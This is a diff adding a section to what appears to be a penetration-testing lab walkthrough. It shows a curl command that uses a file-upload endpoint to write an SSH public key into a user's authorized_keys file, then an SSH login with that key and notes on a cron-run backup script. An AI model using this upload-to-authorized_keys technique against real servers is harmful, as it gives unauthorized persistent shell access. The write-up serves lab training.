@@ -107,3 +107,20 @@ DOWNLOADED: 4612 - FOUND: 2
 
 ![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5e27e0c9-6e25-4efd-a950-c91193e43f58)
 
+## SSH using authorized_keys
+```
+curl -i -X POST -H "Content-Type: multipart/form-data" -F file="@id_rsa.pub.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http:/192.168.212.249:33414/file-upload
+
+```
+```
+ssh -i id_rsa alfredo@<ip> -p 25022
+```
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/cce4b937-8584-4993-a22d-2d1b7837b4f3)
+
+- trying to find , how the files got created , so found a cronjobs file (crontab)
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e426c93f-b4fa-4352-9746-7fc0d4293e44)
+
+`/usr/local/bin/backup-flask.sh`
+ 
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/c189cb72-229e-4542-8a58-5550da22bc69)
+
